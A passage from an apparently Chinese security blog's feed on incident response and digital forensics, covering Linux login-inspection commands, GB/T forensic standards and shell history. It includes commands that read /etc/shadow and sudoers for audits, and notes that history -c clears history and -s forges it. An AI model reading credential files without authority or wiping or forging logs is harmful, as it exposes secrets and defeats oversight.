(ip地址)</code></pre><ul><li>第一列显示用户名</li><li>第二列显示用户连接方式。tty代表用户直接连接到服务器，pts代表远程登录。</li><li>第三、四列分别显示日期和时间</li><li>第五列显示用户登录IP地址。</li></ul><table><thead><tr><th>-a , –all</th><th>与使用选项-b -d –login -p -r -t -T -u相同。</th></tr></thead><tbody><tr><td>-b , –boot</td><td>显示上次系统引导的时间。</td></tr><tr><td>-d , –dead</td><td>显示死进程。</td></tr><tr><td>-H , –heading</td><td>打印一行列标题。</td></tr><tr><td>–ips</td><td>打印IP地址而不是主机名。 使用–lookup，基于存储的IP（如果可用）进行规范化，而不是存储的主机名。</td></tr><tr><td>-l , –login</td><td>打印系统登录过程。</td></tr><tr><td>–lookup</td><td>尝试通过DNS规范化主机名。</td></tr><tr><td>-m</td><td>仅打印有关与标准输入（发出命令的终端）关联的用户和主机的信息。 此方法符合POSIX标准。</td></tr><tr><td>-p , –process</td><td>打印由init生成的活动进程。</td></tr><tr><td>-q , –count</td><td>显示所有<strong>当前登陆的</strong>登录名，以及所有当前<strong>正在登陆的</strong>用户数计数。注意：这里不应理解为列出所有登陆过的用户数，而是此命令只能显示正在登陆的用户。</td></tr><tr><td>-r , –runlevel</td><td>打印当前运行级别。</td></tr><tr><td>-s , –short</td><td>仅打印名称，行和时间字段，这是默认值。</td></tr><tr><td>-t , –time</td><td>如果信息可用，则打印上次更改系统时钟的时间。</td></tr><tr><td>-T , -w , –mesg</td><td>添加一个字符，该字符指示终端的状态: “+”如果终端是可写的，“-”如果终端不是可写的，或“?”</td></tr><tr><td>-u , –users</td><td>打印每个用户的空闲时间和进程ID。</td></tr><tr><td>–message</td><td>与-T相同。</td></tr><tr><td>–writable</td><td>与-T相同。</td></tr><tr><td>–help</td><td>显示帮助消息，然后退出。</td></tr><tr><td>–version</td><td>显示版本信息，然后退出。</td></tr></tbody></table><h3 id="w"><a href="#w" class="headerlink" title="w"></a>w</h3><p><strong>w<a href="https://www.linuxcool.com/">命令</a>用于显示已经登陆系统的用户列表，并显示用户正在执行的指令。执行这个<a href="https://www.linuxcool.com/">命令</a>可得知目前登入系统的用户有那些人，以及他们正在执行的程序。单独执行w命令会显示所有的用户，您也可指定用户名称，仅显示某位用户的相关信息。**</strong>下面让我们详细讲解一下w命令的使用方法。**</p><pre><code>w(选项)(参数)-f 　开启或关闭显示用户从何处登入系统。-h 　不显示各栏位的标题信息列。-l 　使用详细格式列表，此为预设值。-s 　使用简洁格式列表，不显示用户登入时间，终端机阶段作业和程序所耗费的CPU时间。-u 　忽略执行程序的名称，以及该程序耗费CPU时间的信息。-V 　显示版本信息。</code></pre><h3 id="uptime"><a href="#uptime" class="headerlink" title="uptime"></a>uptime</h3><p>系统中的uptime命令主要用于获取主机运行时间和查询linux系统负载等信息。uptime命令可以显示系统已经运行了多长时间，信息显示依次为：现在时间、系统已经运行了多长时间、目前有多少登陆用户、系统在过去的1分钟、5分钟和15分钟内的平均负载。</p><pre><code>uptime  查看登陆多久、多少用户，负载10: 19: 04 //系统当前时间up 257 days, 18: 56 //主机已运行时间，时间越大，说明你的机器越稳定。12 user  //用户连接数，是总连接数而不是用户数load average   // 系统平均负载，统计最近1，5，15分钟的系统平均负载那么什么是系统平均负载呢？ 系统平均负载是指在特定时间间隔内运行队列中的平均进程数。</code></pre><h3 id="入侵排查："><a href="#入侵排查：" class="headerlink" title="入侵排查："></a>入侵排查：</h3><pre><code>1、查询特权用户特权用户(uid 为0)[root@localhost ~]# awk -F:  &#39;$3==0&#123;print $1&#125;&#39; /etc/passwd2、查询可以远程登录的帐号信息[root@localhost ~]# awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></pre><h3 id="清理-限制账户："><a href="#清理-限制账户：" class="headerlink" title="清理/限制账户："></a>清理/限制账户：</h3><pre><code>禁用或删除多余及可疑的帐号  usermod -L user    禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头    userdel user       删除user用户    userdel -r user    将删除user用户，并且将/home目录下的user目录一并删除</code></pre><h2 id="本文参考"><a href="#本文参考" class="headerlink" title="本文参考"></a>本文参考</h2><p><a href="https://blog.csdn.net/discover2210212455/article/details/82711930">https://blog.csdn.net/discover2210212455/article/details/82711930</a></p><p><a href="https://bypass007.github.io/Emergency-Response-Notes/">https://bypass007.github.io/Emergency-Response-Notes/</a> 应急响应实战笔记</p><p><a href="http://c.biancheng.net/view/840.html">http://c.biancheng.net/view/840.html</a></p><p><a href="https://linux.cn/article-2437-1.html">https://linux.cn/article-2437-1.html</a></p><p><a href="https://www.runoob.com/linux/linux-comm-w.html">https://www.runoob.com/linux/linux-comm-w.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;windows查看用户&quot;&gt;&lt;a href=&quot;#windows查看用户&quot; class=&quot;headerlink&quot; title=&quot;windows查看用户&quot;&gt;&lt;/a&gt;windows查看用户&lt;/h2&gt;&lt;h3 id=&quot;whoami&quot;&gt;&lt;a href=&quot;#whoami&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://xtpeeps.cn/2021/04/30/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%9B%BD%E6%A0%87%E4%B8%AD%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E7%9B%B8%E5%85%B3%E8%A6%81%E6%B1%82%E5%8F%8A%E7%BB%BC%E8%BF%B0/"/>
    <id>https://xtpeeps.cn/2021/04/30/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%9B%BD%E6%A0%87%E4%B8%AD%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E7%9B%B8%E5%85%B3%E8%A6%81%E6%B1%82%E5%8F%8A%E7%BB%BC%E8%BF%B0/</id>
    <published>2021-04-30T15:09:50.805Z</published>
    <updated>2021-04-30T15:09:56.810Z</updated>
    
    <content type="html"><![CDATA[<p>应急/司法举证关注什么？国标对于电子取证有哪些明确要求？</p><p>在进行下面之前，我们需要了解下现行国家标准中提及的有关取证需要关注重要点。这里我们参考的国标有：</p><ol><li>GB/T 29360-2012 《电子物证数据恢复检验规程》</li><li>GB/T 29361-2012 《电子物证文件一致性检验规程》</li><li>GB/T 29362-2012 《电子物证数据搜索检验规程》</li><li>GB/T 31500-2015 《信息安全技术 存储介质数据恢复服务要求》</li><li>GB/T 39321-2020 《电子合同取证流程规范》即将实施状态</li></ol><h3 id="电子物证文件一致性检验规定"><a href="#电子物证文件一致性检验规定" class="headerlink" title="电子物证文件一致性检验规定"></a>电子物证文件一致性检验规定</h3><p>参考GB/T 29361-2012 《电子物证文件一致性检验规程》相关内容。</p><h4 id="软件工具要求："><a href="#软件工具要求：" class="headerlink" title="软件工具要求："></a>软件工具要求：</h4><p>要有具有计算哈希值功能的软件</p><h4 id="操作步骤规定："><a href="#操作步骤规定：" class="headerlink" title="操作步骤规定："></a>操作步骤规定：</h4><ol><li><p>检材及样本编号：对送检的检材（样本）进行唯一性编号；</p></li><li><p>检材及样本拍摄：对送检的检材（样本）加上唯一性编号进行拍照</p></li><li><p>检验</p></li><li><ol><li>启动杀毒软件对物证检验工作站系统进行杀毒</li><li>将检材数据文件和样本数据文件进行保全</li><li>使用软件工具分别计算检材数据文件和样本数据文件的哈希值</li><li>哈希值的计算方法按照软件工具使用说明书进行操作</li><li>比较检材数据文件和样本数据文件的哈希值。两个哈希值相同，则可以判断两个文件的数据相同；两个哈希值不同，则可以判断两个文件的数据不同。</li></ol></li></ol><h4 id="检验结论的表述"><a href="#检验结论的表述" class="headerlink" title="检验结论的表述"></a>检验结论的表述</h4><p>经对编号为“n”的检材与编号为“m”的样本使用rr软件工具进行技术检验后，两个文件的数据相同（或不同），其HH哈希值分别为：</p><p>a）编号为“n”检材的哈希值：hhn；</p><p>b）编号为“m”样本的哈希值：hhm；</p><h3 id="数据恢复相关规定"><a href="#数据恢复相关规定" class="headerlink" title="数据恢复相关规定"></a>数据恢复相关规定</h3><p>参考GB/T 29360-2012 《电子物证数据恢复检验规程》</p><h4 id="软件工具要求：-1"><a href="#软件工具要求：-1" class="headerlink" title="软件工具要求："></a>软件工具要求：</h4><p>具有数据恢复功能的软件</p><h4 id="操作步骤规定：-1"><a href="#操作步骤规定：-1" class="headerlink" title="操作步骤规定："></a>操作步骤规定：</h4><ol><li><p>检材及样本编号：对送检的检材（样本）进行唯一性编号</p></li><li><p>检材及样本拍照：对送检的检材（样本）加上唯一性编号进行拍照</p></li><li><p>检材及样本保全备份：对具备保全条件的检材（样本）进行保全备份</p></li><li><p>检验</p></li><li><ol><li>启动杀毒软件对电子物证检验工作站系统进行杀毒</li><li>将检材（若已保全，使用保全的存储设备）通过只读方式连接到电子物证检验工作站</li><li>计算检材（样本）的哈希值</li><li>根据检验要求，使用软件工具进行数据恢复</li><li>恢复数据文件方法应按照软件工具使用说明书进行操作</li><li>将恢复的数据进行筛选后复制到检验专用存储介质中</li></ol></li><li><p>检出数据刻录</p></li><li><ol><li>将检出数据刻录在不可擦写的空白光盘上，应采用封盘刻录</li><li>计算光盘的哈希值</li><li>对光盘进行唯一性编号</li><li>贴上盘签。盘签应注明检验单位名称、光盘编号、光盘哈希值、光盘制作日期等；应加盖检验鉴定专用章</li></ol></li><li><p>检验结论的表述</p></li></ol><p>经对编号为“al”至“an”的检材使用rr软件工具进行技术检验，检验结果如下：</p><p>在检材ai中检出与yy有关数据文件mm个，大小合计bb。检出的数据文件刻录在编号为gg光盘中，该光盘的HH哈希值为hh。</p><h3 id="数据恢复服务规定："><a href="#数据恢复服务规定：" class="headerlink" title="数据恢复服务规定："></a>数据恢复服务规定：</h3><h4 id="术语与定义注意："><a href="#术语与定义注意：" class="headerlink" title="术语与定义注意："></a>术语与定义注意：</h4><ol><li>硬件故障：由于存储介质硬件损坏而造成数据无法访问的故障，一般是指电路故障、机械故障、固件故障、存储介质缺陷等。</li><li>软件故障：由于存储介质中用户数据损坏而造成数据无法访问的故障，一般是指操作系统故障、应用软件故障、用户误操作、计算机病毒破坏等</li><li>开盘修复：打开硬盘盘体或拆取存储芯片，排除存储介质硬件故障的操作</li><li>数据销毁：使用覆盖、消磁等技术手段，清除存储介质上所有数据的操作</li></ol><h4 id="服务条件要求"><a href="#服务条件要求" class="headerlink" title="服务条件要求"></a>服务条件要求</h4><ol><li>从业机构</li></ol><p>从业机构应符合如下要求：</p><p>a）应具有合法经营资格和专业的技术团队</p><p>b）应制定管理只读并采取防止数据泄露的技术措施保护客户数据安全</p><ol><li>从业人员</li></ol><p>从数据恢复服务的人员应具备如下条件</p><p>a）遵守管家法律法规，与从业机构签署劳动合同和保密协议，承担保密义务</p><p>b）具有良好的计算及应用知识，熟悉计算机系统结构、数据存储原理等专业知识</p><p>c）实施存储介质软件故障恢复的技术人员应账务各种高应用操作系统、文件系统的基础理论知识和相关软件和设备使用方法，具有处理软件故障的能力</p><p>d）实施存储介质硬件故障恢复的技术人员应掌握各类电路板、硬盘结构、存储芯片的基础理论知识和相关软件和设备使用方法，具有处理硬件故障的能力。</p><ol><li><p>服务场所及机房</p></li><li><ol><li>服务场所</li></ol></li><li><ol><li><ol><li>数据恢复服务机构应具有独立的、面积适宜的、配备相关设备和消防设施的服务场所；应根据不同的功能划分相互独立的客户接待区、机房和管理办公区。</li></ol></li></ol></li><li><ol><li>机房</li></ol></li><li><ol><li><ol><li>数据恢复服务机构应具备独立的机房，专门用于数据恢复的技术实施。实施硬盘开盘操作应当在不低于六级洁净登记的洁净环境中进行。洁净环境建设应按照GB 50073-2001，机房建设要求应按照GB 50174-2008.</li></ol></li></ol></li><li><p>设备配置</p></li></ol><p>表1数据恢复服务软、硬件工具基本配置要求</p><table><thead><tr><th>序号</th><th>工具类别</th><th>配置要求</th></tr></thead><tbody><tr><td>1</td><td>数据恢复工作专用计算机及配套设备</td><td>a)配置基本的正版操作系统和正版软件工作环境及必要的硬件配套设备;b)写保护设备必须有明确的写保护方向标识必备</td></tr><tr><td>2</td><td>数据镜像工具</td><td>必须具有写保护功能,或该工具的物理接口可以与写保护设备相连必备</td></tr><tr><td>3</td><td>数据销毁工具</td><td>必须支持逐比特数据覆盖功能必备</td></tr><tr><td>4</td><td>软件操作工具</td><td>配置正版的软件工具,包括文件系统恢复工具、数据文件恢复工具、十六进制编辑工具等必备</td></tr><tr><td>5</td><td>备件</td><td>应具备可用于硬件故障恢复的,可替代存储介质故障部分的零部件等备品备件硬件故障恢复必备</td></tr><tr><td>6</td><td>硬件操作工具</td><td>洁净工作台、显微镜、开盘工具、焊接设备、固件操作工具、万用表等硬件故障恢复必备</td></tr></tbody></table><h4 id="服务过程要求"><a href="#服务过程要求" class="headerlink" title="服务过程要求"></a>服务过程要求</h4><ol><li>概述</li></ol><p>存储介质数据恢复的实施过程可氛围介质接收、介质检测、数据恢复、数据交付、数据销毁5个主要环节，其主要工作内容包括：</p><p>a）介质接收：接收存储介质并记录存储介质情况</p><p>b）介质检测：判断存储介质故障类型，制定数据恢复方案</p><p>c）数据恢复：排除存储介质故障，提取可用数据</p><p>d）数据交付：将数据恢复结果交付给客户</p><p>e）数据销毁：销毁数据恢复结果和数据恢复过程中产生的所有相关数据信息。</p><p>上述各环节负责人应对操作及结果进行记录并签字。</p><ol><li>介质接收</li></ol><p>介质接收环节的实施要求如下：</p><p>a）检查送修存储介质，记录其基本情况，包括类型、品牌、幸好、序列号及外观特征</p><p>b）指导客户描述送修存储介质的故障现象，包括故障出现前后的操作、故障表现，并记录上述信息</p><p>c）指导客户描述需要恢复的数据特征，并记录上述信息</p><p>d）告知客户数据恢复实施的相关风险及结果、客户及数据恢复服务机构的职责</p><p>e)客户与数据恢复服务机构应签署服务协议,协议基本内容包括存储介质的基本情况、修复需求、修复风险及各方责任和义务。</p><ol><li><p>介质检测介质检测环节的实施要求如下:</p></li><li><ol><li>检测送修存储介质故障类型,判断本机构是否具备实施条件,若不具备实施条件,应中止数据恢复操作并返还给客户送修存储介质,并对客户说明无法实施的原因;</li><li>对于具备实施条件的,应根据故障类型制定恢复方案,方案包括技术路线、使用方法、软硬件工具、人员时间安排和操作方法等。</li></ol></li><li><p>数据恢复数据恢复环节的实施要求如下:</p></li><li><ol><li>根据存储介质检测结果实施数据恢复操作,需要实施硬盘开盘操作应获得客户书面授权,并在符合要求的洁净环境中实施;</li><li>当存储介质可正常读取后,采用写保护措施对原始存储介质实施镜像,镜像完成后,软件故障的排除需要在镜像数据上进行;</li><li>恢复出的可用数据需保存在专用数据存储设备中,不得覆盖镜像数据或客户的原始数据;</li><li>实施远程数据恢复时,双方均需在符合本标准机房要求的环境中进行,并由专人相互配合,共同完成数据恢复技术操作;</li><li>实施远程数据恢复时,需采取保证系统安全及信息传输安全的技术措施;</li><li>应对原始数据进行保护,不得更改和删除原始存储介质上的数据。</li></ol></li><li><p>数据交付数据交付环节的实施要求如下:</p></li><li><ol><li>数据恢复实施方案完成后,需根据客户描述确认数据的可用率,并将结果如实告知客户,由客户对恢复结果进行确认;</li><li>将数据恢复结果按照客户指定方式进行数据交付;</li><li>数据交付时,应完整归还客户送修的存储介质。</li></ol></li><li><p>数据销毁数据销毁环节实施要求数据交付完成后,应根据协议约定及时销毁数据恢复结果及操作过程中产生的所有相关数据信息。</p></li></ol><h4 id="服务管理要求"><a href="#服务管理要求" class="headerlink" title="服务管理要求"></a>服务管理要求</h4><ol><li><p>人员人员管理要求:</p></li><li><ol><li>人员管理应当权责分明,对所有人员定岗定责;</li><li>数据恢复服务机构有义务对员工进行职业道德教育和技能培训,每年至少两次,并对培训过程及结果进行记录。</li></ol></li><li><p>设备数据恢复设备管理要求:</p></li><li><ol><li>应建立设备维护和管理制度;</li><li>所有设备应做到专机专用,不得安装使用与数据恢复无关的应用程序;</li><li>在数据恢复过程中,除用于远程数据恢复的计算机外,其他设备不得连接互联网;</li><li>未经批准,不得改变现有设备的配置。对软硬件配置的重大变更,应先形成方案文件,经讨论并获得相关负责人批准后,由具备资格的技术人员进行更改,并保留更改和操作记录;</li><li>未经批准,不得在现有设备网络中加入外来移动存储介质;</li><li>未经批准,不得将存储介质带出机房;</li><li>通过网络传输的数据文件需要经过加密;</li><li>专用设备只能由指定人员进行操作;</li><li>定期检测设备运转情况,进行必要的升级维护,保障设备运转正常。</li></ol></li><li><p>机房机房管理要求:</p></li><li><ol><li>机房应安装门禁系统,只允许数据恢复工作人员进入,其他人员进入需要经过审批;</li><li>机房应安装录像监控系统,监控范围应覆盖整个机房,且录像记录应至少保存1个月;</li><li>机房应对不同功能区域进行物理划分,并建立访问登记制度;</li><li>确定责任人定期检查机房设备设施的运转情况,查验相关日志信息,及时排查故障隐患;</li><li>机房内的资料、数据、配置参数等信息应妥善保管,未经批准不得以任何形式提供给其他无关人员。</li></ol></li><li><p>存储介质存储介质管理要求:</p></li><li><ol><li>存储介质管理包括客户盘、工作盘、备件盘;</li><li>存储介质管理应遵循易取易存原则,集中存放、分类管理,应建立专用的存储介质库并安排专人管理;</li><li>应建立存储介质档案,对存储介质逐一编号,详细记录其品牌、型号、容量、序列号及性能等信息;</li><li>客户存储介质应粘贴唯一性标签,同一工作单的客户存储介质应集中放置一处,并在专门防磁、防静电的存储环境中保存;</li><li>存储介质管理员负责对存储介质库的维护和管理工作,应建立出入库登记制度,并定期盘点。</li></ol></li><li><p>质量控制</p></li><li><ol><li>抽查</li></ol></li><li><ol><li><ol><li>应制定并实行质量抽查制度,按月对数据恢复进度和结果以及服务承诺进行抽查,抽样数量不低于当月总业务量的5%,抽查结果应详细记录。</li></ol></li></ol></li><li><ol><li>投诉处理</li></ol></li><li><ol><li><ol><li>应建立良好的投诉处理机制:</li></ol></li></ol></li><li><ol><li><ol><li><ol><li>应在网站和服务场所显著位置公布投诉电话,为客户提供投诉渠道,包括邮件、电话、信函和面谈等形式;</li><li>接受客户投诉时,需记录并核对如下信息:投诉人的姓名、地址和联系方式、投诉的原因、目的、要求等投诉细节;</li><li>受理投诉后,应核实投诉人所叙述的投诉细节是否属实,对于投诉属实的应确定相关事件责任人,并组织整改。</li></ol></li></ol></li></ol></li><li><ol><li>客户回访数据恢复服务完成后,应对客户进行回访,了解数据恢复服务质量,并根据回访情况实行服务改进。</li></ol></li></ol><h3 id="电子证据检索规定"><a href="#电子证据检索规定" class="headerlink" title="电子证据检索规定"></a>电子证据检索规定</h3><p>参考GB/T 29362-2012 电子物证数据搜索检验规程 中提到了关于电子物证数据检索的规定：</p><h4 id="术语定义注意："><a href="#术语定义注意：" class="headerlink" title="术语定义注意："></a>术语定义注意：</h4><ol><li>文件搜索：根据已知内容或关键字对送检存储设备或介质的数据文件进行搜索检验；</li><li>物理搜素：根据已知内容或关键自对送检存储设备或介质的二进制数据进行搜索检验；</li><li>保全备份：对原始数据进行完整、精确、无损的备份。</li></ol><h4 id="电子物证数据搜索检验仪器设备要求："><a href="#电子物证数据搜索检验仪器设备要求：" class="headerlink" title="电子物证数据搜索检验仪器设备要求："></a>电子物证数据搜索检验仪器设备要求：</h4><ol><li>硬件上存储介质、保全备份设备、具有只读接口的电子物证检验工作站；</li><li>软件要求具有数据搜索功能的软件、操作系统提供的资料（文件）管理器等。</li></ol><h4 id="对于操作步骤的要求："><a href="#对于操作步骤的要求：" class="headerlink" title="对于操作步骤的要求："></a>对于操作步骤的要求：</h4><ol><li><p>检材及样本编号：对送检的检材（样本）进行唯一性编号；</p></li><li><p>检材及样本拍照：对送检的检材（样本）加上唯一性编号进行拍照；</p></li><li><p>检材及样本保全备份：对具备保全条件的检材（样本）进行保全备份</p></li><li><p>检验：</p></li><li><ol><li>启动杀毒软件对电子物证检验工作站系统进行杀毒</li><li>将检验（样本）（若已保全，使用保全的存储设备）通过只读方式链接到电子物证检验工作站</li><li>计算检材（样本）的哈希值</li><li>根据检验要求，使用软件工具进行文件搜索或物理搜索</li><li>搜索数据应按照软件工具使用说明书进行操作</li><li>将搜索结果按检验要求筛选后复制到检验专用存储</li></ol></li></ol><h4 id="检出数据刻录："><a href="#检出数据刻录：" class="headerlink" title="检出数据刻录："></a>检出数据刻录：</h4><ol><li>将检出数据刻录在不可擦写的空白光盘上，应采用封盘刻录</li><li>计算光盘的哈希值</li><li>对光盘进行唯一性编号</li><li>贴上盘签。盘签内容应注明检验单位名称、光盘编号、光盘哈希值、光盘制作日期等；应加盖检验鉴定专用章</li></ol><h4 id="检验结论的表述："><a href="#检验结论的表述：" class="headerlink" title="检验结论的表述："></a>检验结论的表述：</h4><p>经对编号为“ai”～“an”的检材使用rr软件工具进行技术检验，检验结果如下：</p><p>在检材ai中检出与yy有关数据文件mm个，大小合集bb。检出的数据文件刻录在编号为gg光盘中，该光盘的HH哈希值为hh。（或在检材ai中未检出与yy有关的数据文件。）</p><h3 id="结论综述："><a href="#结论综述：" class="headerlink" title="结论综述："></a>结论综述：</h3><p>从国标的技术要求和规定来看，可以看到国标中对电子取证的规范性、权威性提出了一定的要求和规定，尤其是数据恢复服务资质、条件，电子证物的保全、证据检索固定的规范做了比较明确的规定。而对于软件工具的具体产品型号并没有强制的限定。</p><p>根据国标的规定，还可以看出电子证物的取证分析数据恢复等，是一系列非常严谨的工作，需要占用和消耗大量的时间和精力规划和布局相关工作流程，相关人员培养。</p><p>因此，对于日常安全运营，我们更多的是参考行业对于应急响应专项排查中提到相关重点内容排查方法进行排查。没有相关资质和经验的个人和公司，并不能胜任司法级别的电子取证固定工作。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;应急/司法举证关注什么？国标对于电子取证有哪些明确要求？&lt;/p&gt;
&lt;p&gt;在进行下面之前，我们需要了解下现行国家标准中提及的有关取证需要关注重要点。这里我们参考的国标有：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;GB/T 29360-2012 《电子物证数据恢复检验规程》&lt;/li&gt;
&lt;li</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://xtpeeps.cn/2021/04/30/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/"/>
    <id>https://xtpeeps.cn/2021/04/30/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/</id>
    <published>2021-04-30T15:08:51.483Z</published>
    <updated>2021-04-30T15:08:57.416Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux下命令行历史记录"><a href="#linux下命令行历史记录" class="headerlink" title="linux下命令行历史记录"></a>linux下命令行历史记录</h1><p><strong>原理的解释</strong></p><p>这里参考<a href="https://www.cnblogs.com/bpzblog/p/13121930.html">白<em>胖</em>子</a>关于linux命令行history的解释，其中概述对history的原理解释的比较通俗易懂，这里引用过来：</p><ul><li>当执行命令后，系统默认会在内存记录执行过的命令</li><li>当用户正常退出时，会将内存的命令历史存放对应历史文件中，默认是~/.bash_history</li><li>登录shell时，会读取命令历史文件中记录下的命令加载到内存中</li><li>登录进shell后新执行的命令只会记录在内存的缓存区中；这些命令会用户正常退出时“追加”至命令历史文件中</li><li>利用命令历史。可以用它来重复执行命令，提高输入效率</li></ul><p><strong>bash history内建函数</strong></p><p>bash提供两个内置命令操纵历史记录列表和历史记录文件。</p><h2 id="fc命令"><a href="#fc命令" class="headerlink" title="fc命令"></a>fc命令</h2><pre><code>fc [-e ename] [-lnr] [first] [last]fc -s [pat=rep] [command]</code></pre><table><thead><tr><th>-e&lt;文本编辑器&gt;</th><th>指定用来编辑命令的文本编辑器，默认是vi</th></tr></thead><tbody><tr><td>-l</td><td>列出第一条和最后一条命令范围内的历史命令，如果不跟命令范围则默认显示最近使用过的16条历史命令</td></tr><tr><td>-n</td><td>显示历史命令时不显示命令序号</td></tr><tr><td>-r</td><td>反序显示所有历史命令</td></tr><tr><td>-s&lt;命令名&gt;</td><td>从历史命令中当前位置往前找到指定命令，并执行</td></tr></tbody></table><pre><code>显示历史命令列表（默认打印最近的16条历史命令）：fc -l显示历史命令列表 1-99行：fc -l 1 99指定使用ex文本编辑器编辑命令：fc -e ex显示历史命令列表但不显示命令序号：fc -n反序显示所有历史命令：fc -r从历史命令中找到find命令，并执行：fc -s find</code></pre><blockquote><p>EXTENDED_HISTORY环境变量影响fc命令的执行，如果变量设置为ON，则记录时间，否则不记录时间。在/etc/profile中添加export EXTENDED_HISTORY=ON 即可开启命令时间记录。</p><p>kali：因为shell是zsh，因此配置在/etc/zsh/zshrc  </p></blockquote><h2 id="history命令"><a href="#history命令" class="headerlink" title="history命令"></a>history命令</h2><pre><code>history [-c] [-d offset] [n] history -awrn [filename] history -ps arg [arg...]history [n]  n为数字，列出最近的n条命令-c  将目前shell中的所有history命令消除history [-raw] histfiles-a 将目前新增的命令写入histfiles, 默认写入~/.bash_history-r  将histfiles内容读入到目前shell的history记忆中-w 将目前history记忆的内容写入到histfiles-s: 展开历史参数成一行，附加在历史列表后。用于伪造命令历史使用! 执行历史命令。! number 执行第几条命令! command 从最近的命令查到以command开头的命令执行!! 执行上一条</code></pre><blockquote><p><strong>history的历史命令保存在~/.bash_history 文件中.</strong></p></blockquote><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p><strong>history配置修改</strong></p><p>配置文件：/etc/profile 与history相关的环境变量</p><ul><li>history相关配置说明</li></ul><pre><code>HISTFILE          指定存放历史文件位置，默认位置在~/.bash_profile（针对用户）、       /etc/profile(针对全局，如果~/.bash_profile内没有相关环境变量内容则使用全局变量设置) HISTFILESIZE      命令历史文件记录历史的条数 HISTSIZE          命令历史记录的条数，默认为1000 HISTTIMEFORMAT=&quot;%F %T&quot;  显示命令发生的时间 HISTIGNORE=&quot;str1:str2:...&quot; 忽略string1,string2历史 HISTCONTROL      包含一下4项，让哪一项生效只需要让其=下面一项即可 ignoredups:  忽略重复的命令；连续且相同方为“重复” ignorespace:  忽略所有以空白开头的命令 ignoreboth:ignoredups,ignorespace erasedups:    删除重复命令</code></pre><ul><li>history记录命令时间戳</li></ul><pre><code>在.bashrc 或者/etc/profile文件中添加几行配置即可          HISTFILESIZE=2000          HISTSIZE=2000         HISTTIMEFORMAT=&quot;%F %T &quot;        export HISTTIMEFORMAT设置好之后，执行history命令，就会显示每条历史命令的详细执行时</code></pre><p>本节参考：<a href="https://blog.csdn.net/u011498933/article/details/99541059">https://blog.csdn.net/u011498933/article/details/99541059</a></p><p><a href="https://linux265.com/course/linux-command-fc.html">https://linux265.com/course/linux-command-fc.html</a></p><h1 id="windows下命令行历史记录"><a href="#windows下命令行历史记录" class="headerlink" title="windows下命令行历史记录"></a>windows下命令行历史记录</h1><h2 id="doskey命令"><a href="#doskey命令" class="headerlink" title="doskey命令"></a>doskey命令</h2><p>该命令用于调用和建立DOS<a href="https://baike.baidu.com/item/%E5%AE%8F%E5%91%BD%E4%BB%A4">宏命令</a></p><pre><code>doskey [/reinstall] [/listsize=&lt;Size&gt;] [/macros:[all | &lt;ExeName&gt;] [/history] [/insert | /overstrike] [/exename=&lt;ExeName&gt;] [/macrofile=&lt;FileName&gt;] [&lt;MacroName&gt;=[&lt;Text&gt;]]/reinstall                              清空命令历史缓冲区并重新安装doskey/listsize=&lt;Size&gt;                指定历史缓冲区的命令行数目/macros                                 显示doskey宏，需要使用重定向符号“&gt;”将宏重新存储到一个文件中，该参数可以简写为/m/macros:all                         为所有可执行文件显示doskey宏/macros:&lt;ExeName&gt;               为指定的exe文件名称显示所有可执行宏/history                                    显示存储在内存中的命令，可以使用重定向符号“&gt;”将宏重新存储到一个文件中，该参数可以简写为/h[/insert | /overstrike]     指定是否将你输入的文本插入或覆盖，如果使用/insert参数，你输入的文本将插入到已存在的文本中。如果使用/overwrite参数，新输入的文本将覆盖存在的文本，默认参数问/overwrite。/exename=&lt;ExeName&gt;              指定允许宏的可执行文件名称/macrofile=&lt;FileName&gt;           指定你想要安装的包含宏的文件&lt;MacroName&gt;=[&lt;Text&gt;]            创建由Text指定的命令的宏，MacroName指定宏的名称，Text指定你想要录制的命令，如果Text留空，则删除MacroName。 [1] </code></pre><p>doskey /history</p><blockquote><p>需要注意的是：doskey 只能查看当前shell对话框中的命令历史记录，无法查看其他shell对话框中的历史记录</p></blockquote><h2 id="快捷键命令"><a href="#快捷键命令" class="headerlink" 